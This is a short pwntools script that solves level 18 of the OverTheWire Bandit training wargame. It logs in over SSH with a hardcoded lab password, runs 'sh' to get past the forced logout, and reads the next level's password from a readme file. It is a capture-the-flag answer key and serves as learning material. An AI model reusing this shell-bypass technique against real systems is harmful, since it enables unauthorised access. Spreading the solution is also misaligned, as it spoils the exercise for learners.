#!/usr/bin/env python
from pwn import *

log.info('overthewire.org - bandit18 exploit by SKane')

shell = ssh('bandit18', 'bandit.labs.overthewire.org', password='kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd', port=2220)

sh = shell.run('sh')

sh.sendline('cat readme')

log.success("Password for bandit19: " + sh.recvline())
